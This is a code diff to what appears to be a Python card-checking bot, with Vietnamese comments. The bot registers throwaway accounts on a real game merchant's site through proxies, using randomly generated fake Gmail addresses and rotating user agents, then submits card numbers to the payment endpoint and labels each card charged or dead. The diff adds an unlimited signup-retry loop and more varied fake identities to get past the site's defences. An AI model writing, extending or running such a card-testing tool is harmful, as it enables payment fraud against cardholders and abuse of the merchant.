@@ -9,6 +9,7 @@ import base64
 from datetime import datetime
 import random
 import string
+import time
 from fake_useragent import UserAgent
 import urllib3
 from colorama import Fore, init
@@ -311,10 +312,46 @@ def get_short_brand_name(cc):
     else: return 'unknown'
 
 def generate_random_email():
-    names = ["nguyenvan", "minhquan", "hoangnam", "tienphat", "thanhdat", "huydz", "tuananh"]
-    name = random.choice(names)
-    random_str = ''.join(random.choices(string.digits, k=3))
-    return f"{name}{random_str}@gmail.com"
+    # Danh sách 100 tên phổ biến tại Việt Nam
+    vietnamese_names = [
+        "An", "Anh", "Bao", "Binh", "Cuong", "Chau", "Chi", "Dung", "Dat", "Duc", 
+        "Duy", "Diep", "Duong", "Giang", "Gia", "Hai", "Hao", "Hieu", "Hoang", "Huy", 
+        "Hung", "Hanh", "Hoa", "Hue", "Huong", "Khanh", "Khoi", "Kien", "Kiet", "Lamm", 
+        "Linh", "Long", "Loc", "Luan", "Ly", "Mai", "Minh", "Manh", "Nam", "Nghia", 
+        "Ngoc", "Nguyen", "Nhan", "Nhat", "Nhi", "Nhung", "Oanh", "Phong", "Phuc", "Phuong", 
+        "Quan", "Quang", "Quoc", "Quyen", "Son", "Sang", "Sinh", "Si", "Tai", "Tam", 
+        "Tan", "Thang", "Thanh", "Thao", "Thinh", "Thu", "Thuy", "Tien", "Tin", "Toan", 
+        "Tri", "Trong", "Truc", "Trung", "Tu", "Tuan", "Tung", "Tuyet", "Uyen", "Van", 
+        "Viet", "Vu", "Vy", "Xuan", "Yen", "Tram", "Trang", "Dieu", "Ha", "Thien",
+        "Bich", "Cam", "Dan", "Loan", "Nga", "Phu", "Thuan", "Vinh", "Khoa"
+    ]
+    
+    # Các từ ngữ/hậu tố người Việt hay dùng
+    suffixes = [
+        "vip", "pro", "cute", "baby", "xinh", "depzai", "hotboy", "hotgirl", 
+        "no1", "so1", "123", "999", "888", "6789", "2k", "2k1", "2k2", "2k3", 
+        "9x", "8x", "official", "real", "bds", "hcm", "hn", "love", "forever"
+    ]
+    
+    # Random họ (giả lập)
+    last_names = ["nguyen", "tran", "le", "pham", "hoang", "huynh", "phan", "vu", "vo", "dang", "bui", "do"]
+
+    name = random.choice(vietnamese_names).lower()
+    last = random.choice(last_names).lower()
+    suffix = random.choice(suffixes)
+    random_num = ''.join(random.choices(string.digits, k=random.randint(2, 4)))
+    
+    # Các kiểu ghép tên email phổ biến
+    formats = [
+        f"{last}{name}{random_num}",
+        f"{name}{last}{suffix}",
+        f"{name}{suffix}{random_num}",
+        f"{last}.{name}.{random_num}",
+        f"{name}_{suffix}_{random_num}"
+    ]
+    
+    email_user = random.choice(formats)
+    return f"{email_user}@gmail.com"
 
 def generate_dadus():
     try:
@@ -331,53 +368,79 @@ def generate_dadus():
 def process_check_card(cc, mm, yyyy, cvc):
     """
     Hàm thực hiện toàn bộ quy trình: Đăng ký -> Mã hóa -> Charge
-    Trả về chuỗi kết quả để Bot gửi tin nhắn.
+    Cập nhật: Retry đăng ký liên tục khi thất bại với email mới.
     """
     
-    # Tạo session mới cho mỗi lần check để tránh xung đột cookie
+    # Tạo session mới cho mỗi lần check
     session = requests.Session()
     session.proxies.update(proxies)
     session.verify = False
+    
+    # Biến để lưu user-agent hiện tại, giúp charge dùng đúng UA lúc đăng ký
+    current_user_agent = ""
+    current_email = ""
 
     try:
-        # --- BƯỚC 1: LẤY TOKEN & ĐĂNG KÝ ---
-        reg_headers = {
-            'accept': '*/*',
-            'accept-language': 'vi-VN,vi;q=0.9',
-            'referer': 'https://taongafarm.com/en/',
-            'user-agent': UserAgent().random,
-        }
+        # --- BƯỚC 1: LẤY TOKEN & ĐĂNG KÝ (RETRY LOOP) ---
+        retry_count = 0
+        while True:
+            retry_count += 1
+            # Reset cookie nếu retry
+            session.cookies.clear()
+            
+            current_user_agent = UserAgent().random
+            current_email = generate_random_email()
+            
+            try:
+                # 1.1 Lấy Token CSRF
+                reg_headers = {
+                    'accept': '*/*',
+                    'accept-language': 'vi-VN,vi;q=0.9',
+                    'referer': 'https://taongafarm.com/en/',
+                    'user-agent': current_user_agent,
+                }
 
-        resp_token = session.get('https://taongafarm.com/api/token.js', headers=reg_headers, timeout=20)
-        match = re.search(r"window\.csrftoken='([^']+)'", resp_token.text)
-        if not match:
-             match = re.search(r"window.csrftoken='([^']+)'", resp_token.text)
-        
-        if not match:
-            return f"❌ {cc}|{mm}|{yyyy}|{cvc} - Lỗi: Không lấy được Token"
-        
-        token = match.group(1)
-        
-        # Đăng ký
-        current_email = generate_random_email()
-        reg_headers.update({
-            'accept': 'application/json, text/plain, */*',
-            'content-type': 'application/json',
-            'x-csrf-token': token,
-        })
-        session.cookies.set('_csrf', token, domain='taongafarm.com')
+                resp_token = session.get('https://taongafarm.com/api/token.js', headers=reg_headers, timeout=20)
+                match = re.search(r"window\.csrftoken='([^']+)'", resp_token.text)
+                if not match:
+                     match = re.search(r"window.csrftoken='([^']+)'", resp_token.text)
+                
+                if not match:
+                    # Nếu lỗi mạng hoặc không lấy được token, retry tiếp
+                    continue
+                
+                token = match.group(1)
+                
+                # 1.2 Gửi Request Đăng ký
+                reg_headers.update({
+                    'accept': 'application/json, text/plain, */*',
+                    'content-type': 'application/json',
+                    'x-csrf-token': token,
+                })
+                session.cookies.set('_csrf', token, domain='taongafarm.com')
 
-        reg_data = {
-            'email': current_email,
-            'password': 'Minhnhat@@123',
-            'register_info': {'device': {}, 'lang': 'en', 'nav': {'platform': 'Win32'}},
-            'skip_email_validation': False,
-            'user_agree_terms': True,
-        }
+                reg_data = {
+                    'email': current_email,
+                    'password': 'Minhnhat@@123',
+                    'register_info': {'device': {}, 'lang': 'en', 'nav': {'platform': 'Win32'}},
+                    'skip_email_validation': False,
+                    'user_agree_terms': True,
+                }
 
-        resp_reg = session.post('https://taongafarm.com/api/login/signup', headers=reg_headers, json=reg_data, timeout=20)
-        if 'session_portal' not in session.cookies.get_dict():
-            return f"❌ {cc}|{mm}|{yyyy}|{cvc} - Lỗi: Đăng ký thất bại"
+                resp_reg = session.post('https://taongafarm.com/api/login/signup', headers=reg_headers, json=reg_data, timeout=20)
+                
+                # Kiểm tra thành công: phải có session_portal trong cookie
+                if 'session_portal' in session.cookies.get_dict():
+                    # Đăng ký thành công -> Thoát vòng lặp retry
+                    break
+                else:
+                    # Đăng ký thất bại -> Lặp lại (tự động clear cookie ở đầu vòng lặp)
+                    continue
+
+            except Exception:
+                # Gặp lỗi Exception trong quá trình request -> Lặp lại
+                time.sleep(1) # Nghỉ 1 xíu tránh spam quá nhanh gây lỗi connection
+                continue
 
         # --- BƯỚC 2: MÃ HÓA THẺ ---
         encrypted_data = encrypt_card_data_480(cc, mm, yyyy, cvc, ADYEN_KEY, STRIPE_KEY, DOMAIN_URL)
@@ -388,7 +451,7 @@ def process_check_card(cc, mm, yyyy, cvc):
             'content-type': 'application/json',
             'origin': 'https://taongafarm.com',
             'referer': 'https://taongafarm.com/',
-            'user-agent': reg_headers['user-agent'],
+            'user-agent': current_user_agent, # Dùng lại UA lúc đăng ký
         }
 
         payment_json_data = {
@@ -429,7 +492,7 @@ def process_check_card(cc, mm, yyyy, cvc):
         
         # Phân loại kết quả
         if resultCode == "Authorised":
-            return f"✅ CHARGED: {cc}|{mm}|{yyyy}|{cvc} - [Authorised]"
+            return f"✅ CHARGED: {cc}|{mm}|{yyyy}|{cvc} - [Authorised] - Email: {current_email}"
         elif resultCode == "Refused":
             return f"❌ DIE: {cc}|{mm}|{yyyy}|{cvc} - [{refusalReasonRaw}]"
         elif resultCode in ["IdentifyShopper", "ChallengeShopper", "RedirectShopper"]:
